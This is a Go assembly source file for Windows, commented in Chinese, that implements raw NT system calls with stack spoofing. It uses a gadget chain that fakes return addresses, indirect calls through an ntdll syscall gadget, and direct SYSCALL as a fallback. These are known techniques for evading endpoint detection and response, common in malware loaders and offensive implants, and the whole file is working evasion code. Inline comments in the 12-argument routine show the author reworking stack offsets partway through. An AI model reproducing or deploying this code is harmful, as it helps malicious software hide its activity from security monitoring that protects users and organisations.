//go:build windows
// +build windows

// ============================================================
// 栈欺骗返回桩 — 独立TEXT函数，供rawSyscall的gadget链跳回
// Go asm flag=0函数: [SP]=caller_BP, [SP+8]=return_addr, FP=SP+16
// gadget链恢复SP后: [SP]=caller_BP, [SP+8]=return_addr
// ret+40(FP)=[SP+56], ret+56(FP)=[SP+72], ret+104(FP)=[SP+120]
// ============================================================

// spoofed4Ret — rawSyscall4栈欺骗返回
TEXT ·spoofed4Ret(SB),0,$0-0
    MOVQ AX, 56(SP)
    ADDQ $8, SP    // 跳过saved BP
    RET

// spoofed6Ret — rawSyscall6栈欺骗返回
TEXT ·spoofed6Ret(SB),0,$0-0
    MOVQ AX, 72(SP)
    ADDQ $8, SP    // 跳过saved BP
    RET

// spoofed12Ret — rawSyscall12栈欺骗返回
TEXT ·spoofed12Ret(SB),0,$0-0
    MOVQ AX, 120(SP)
    ADDQ $8, SP    // 跳过saved BP
    RET

// ============================================================
// rawSyscall4 — 4参数syscall
// 三级路径: 栈欺骗 > 间接CALL > 直接SYSCALL
// 关键: 必须在SUBQ之前把所有FP参数读到寄存器
//       因为SUBQ改变了SP，而FP是相对于SP的偏移
// ============================================================
TEXT ·rawSyscall4(SB),0,$0-48
    MOVL ·spoofEnabled(SB), R15
    CMPL R15, $0
    JE   indirect4
    // 栈欺骗路径 — 先把参数读到寄存器
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ a2+16(FP), DX
    MOVQ a3+24(FP), R8
    MOVQ a4+32(FP), R9
    MOVQ CX, R10
    // 准备gadget链
    MOVQ $·spoofed4Ret(SB), R15
    MOVQ ·spoofRetGadget(SB), R12
    MOVQ ·spoofCleanup4(SB), R13
    MOVQ ·ntdllGadget(SB), R14
    SUBQ $0x40, SP
    MOVQ R12, 0x00(SP)    // ret gadget
    MOVQ R13, 0x08(SP)    // add rsp,0x28;ret
    MOVQ $0, 0x10(SP)     // padding
    MOVQ $0, 0x18(SP)
    MOVQ $0, 0x20(SP)
    MOVQ $0, 0x28(SP)
    MOVQ $0, 0x30(SP)
    MOVQ R15, 0x38(SP)    // real_return
    JMP R14

indirect4:
    MOVQ ·ntdllGadget(SB), R11
    CMPQ R11, $0
    JE   direct4
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10
    MOVQ a2+16(FP), DX
    MOVQ a3+24(FP), R8
    MOVQ a4+32(FP), R9
    MOVQ ·ntdllGadget(SB), R11
    CALL R11
    MOVQ AX, ret+40(FP)
    RET
direct4:
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10
    MOVQ a2+16(FP), DX
    MOVQ a3+24(FP), R8
    MOVQ a4+32(FP), R9
    SYSCALL
    MOVQ AX, ret+40(FP)
    RET

// ============================================================
// rawSyscall6 — 6参数syscall
// 先把所有参数读到寄存器，再SUBQ
// ============================================================
TEXT ·rawSyscall6(SB),0,$0-64
    MOVL ·spoofEnabled(SB), R15
    CMPL R15, $0
    JE   indirect6
    // 栈欺骗路径 — 先把参数读到寄存器
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ a2+16(FP), DX
    MOVQ a3+24(FP), R8
    MOVQ a4+32(FP), R9
    MOVQ a5+40(FP), R11
    MOVQ a6+48(FP), R12
    MOVQ CX, R10
    // 准备gadget链
    MOVQ $·spoofed6Ret(SB), R15
    MOVQ ·spoofRetGadget(SB), CX    // 临时用CX(已保存到R10)
    MOVQ ·spoofCleanup6(SB), R13
    MOVQ ·ntdllGadget(SB), R14
    SUBQ $0x50, SP
    MOVQ CX, 0x00(SP)    // ret gadget (CX=spoofRetGadget)
    MOVQ R13, 0x08(SP)   // add rsp,0x38;ret
    MOVQ $0, 0x10(SP)    // padding
    MOVQ $0, 0x18(SP)
    MOVQ $0, 0x20(SP)
    MOVQ R11, 0x28(SP)   // arg5
    MOVQ R12, 0x30(SP)   // arg6
    MOVQ $0, 0x38(SP)    // padding
    MOVQ $0, 0x40(SP)    // padding
    MOVQ R15, 0x48(SP)   // real_return
    JMP R14

indirect6:
    MOVQ ·ntdllGadget(SB), R11
    CMPQ R11, $0
    JE   direct6
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10
    MOVQ a2+16(FP), DX
    MOVQ a3+24(FP), R8
    MOVQ a4+32(FP), R9
    // x64 syscall: arg5=[RSP+0x28], arg6=[RSP+0x30] (CALL后)
    // CALL前写入[SP+0x20]和[SP+0x28], CALL后偏移自动+8
    MOVQ a5+40(FP), R11
    MOVQ R11, 0x20(SP)
    MOVQ a6+48(FP), R12
    MOVQ R12, 0x28(SP)
    MOVQ ·ntdllGadget(SB), R11
    CALL R11
    MOVQ AX, ret+56(FP)
    RET
direct6:
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10
    MOVQ a2+16(FP), DX
    MOVQ a3+24(FP), R8
    MOVQ a4+32(FP), R9
    // SYSCALL不压返回地址, arg5=[RSP+0x28], arg6=[RSP+0x30]
    MOVQ a5+40(FP), R11
    MOVQ R11, 0x28(SP)
    MOVQ a6+48(FP), R12
    MOVQ R12, 0x30(SP)
    SYSCALL
    MOVQ AX, ret+56(FP)
    RET

// ============================================================
// rawSyscall12 — 12参数syscall
// 先把所有参数读到寄存器，再SUBQ
// ============================================================
TEXT ·rawSyscall12(SB),0,$0-112
    MOVL ·spoofEnabled(SB), R15
    CMPL R15, $0
    JE   indirect12
    // 栈欺骗路径 — 先把前4个参数读到寄存器
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ a2+16(FP), DX
    MOVQ a3+24(FP), R8
    MOVQ a4+32(FP), R9
    MOVQ CX, R10
    // 准备gadget链
    MOVQ $·spoofed12Ret(SB), R15
    MOVQ ·spoofRetGadget(SB), CX    // 临时用CX
    MOVQ ·spoofCleanup12(SB), R13
    MOVQ ·ntdllGadget(SB), R14
    SUBQ $0x80, SP
    MOVQ CX, 0x00(SP)    // ret gadget
    MOVQ R13, 0x08(SP)   // add rsp,0x68;ret
    MOVQ $0, 0x10(SP)    // padding
    MOVQ $0, 0x18(SP)
    MOVQ $0, 0x20(SP)
    // arg5-arg12: 需要从原始FP位置读取,但SUBQ后FP已偏移
    // 所以在SUBQ前把FP值保存到BX,然后用BX+offset读取
    // 不对,已经SUBQ了...需要重新设计
    // 解决: 用R11逐个搬运,在SUBQ之前已经没法做了
    // 实际上我们在SUBQ后,可以用原始SP+0x80+16来计算原FP
    // 原始SP = 当前SP + 0x80, 原FP = 原始SP + 16
    LEAQ 0x80(SP), BX      // BX = original SP
    ADDQ $16, BX            // BX = original FP
    MOVQ 40(BX), R11        // a5
    MOVQ R11, 0x28(SP)
    MOVQ 48(BX), R11        // a6
    MOVQ R11, 0x30(SP)
    MOVQ 56(BX), R11        // a7
    MOVQ R11, 0x38(SP)
    MOVQ 64(BX), R11        // a8
    MOVQ R11, 0x40(SP)
    MOVQ 72(BX), R11        // a9
    MOVQ R11, 0x48(SP)
    MOVQ 80(BX), R11        // a10
    MOVQ R11, 0x50(SP)
    MOVQ 88(BX), R11        // a11
    MOVQ R11, 0x58(SP)
    MOVQ 96(BX), R11        // a12
    MOVQ R11, 0x60(SP)
    MOVQ $0, 0x68(SP)       // padding
    MOVQ $0, 0x70(SP)       // padding
    MOVQ R15, 0x78(SP)      // real_return
    JMP R14

indirect12:
    MOVQ ·ntdllGadget(SB), R11
    CMPQ R11, $0
    JE   direct12
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10
    MOVQ a2+16(FP), DX
    MOVQ a3+24(FP), R8
    MOVQ a4+32(FP), R9
    // x64 syscall: arg5=[RSP+0x28]..arg12=[RSP+0x68] (CALL后)
    // CALL前写入[SP+0x20]..[SP+0x60]
    MOVQ a5+40(FP), R11
    MOVQ R11, 0x20(SP)
    MOVQ a6+48(FP), R11
    MOVQ R11, 0x28(SP)
    MOVQ a7+56(FP), R11
    MOVQ R11, 0x30(SP)
    MOVQ a8+64(FP), R11
    MOVQ R11, 0x38(SP)
    MOVQ a9+72(FP), R11
    MOVQ R11, 0x40(SP)
    MOVQ a10+80(FP), R11
    MOVQ R11, 0x48(SP)
    MOVQ a11+88(FP), R11
    MOVQ R11, 0x50(SP)
    MOVQ a12+96(FP), R11
    MOVQ R11, 0x58(SP)
    MOVQ ·ntdllGadget(SB), R11
    CALL R11
    MOVQ AX, ret+104(FP)
    RET
direct12:
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10
    MOVQ a2+16(FP), DX
    MOVQ a3+24(FP), R8
    MOVQ a4+32(FP), R9
    // SYSCALL不压返回地址, arg5=[RSP+0x28]..arg12=[RSP+0x68]
    MOVQ a5+40(FP), R11
    MOVQ R11, 0x28(SP)
    MOVQ a6+48(FP), R11
    MOVQ R11, 0x30(SP)
    MOVQ a7+56(FP), R11
    MOVQ R11, 0x38(SP)
    MOVQ a8+64(FP), R11
    MOVQ R11, 0x40(SP)
    MOVQ a9+72(FP), R11
    MOVQ R11, 0x48(SP)
    MOVQ a10+80(FP), R11
    MOVQ R11, 0x50(SP)
    MOVQ a11+88(FP), R11
    MOVQ R11, 0x58(SP)
    MOVQ a12+96(FP), R11
    MOVQ R11, 0x60(SP)
    SYSCALL
    MOVQ AX, ret+104(FP)
    RET
